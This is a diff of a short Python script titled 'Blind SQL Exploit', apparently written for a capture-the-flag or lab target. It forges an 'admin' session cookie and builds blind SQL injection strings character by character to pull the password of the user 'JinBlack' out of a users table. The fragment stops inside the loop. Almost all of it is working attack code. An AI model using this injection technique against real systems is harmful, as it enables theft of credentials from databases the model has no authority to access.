@@ -1,27 +1,22 @@
+# Blind SQL Exploit  
 import requests
 
-#lowrer case 97 122
-
-#upercase 65 90
-
+#ascci characters
+#lowercase is from 97 to 122
+#upercase is from 65 to 90
 
 parameters = {}
 
 headers = {'user-agent': 'firefox/0.0.1'}
 
-
 jar = requests.cookies.RequestsCookieJar()
 jar.set('session', 'admin')
-
 
 asciiC = 65
 asciiL = 97
 
-
 for y in range (40):
-
     for x in range(128):
-
         injection = "' AND (SELECT ASCII(SUBSTRING(password,"+str(y+1)+","+str(y+1)+")) FROM users where username='JinBlack') = "+str(x)+"; -- "
         #asciiC = asciiC + 1
 
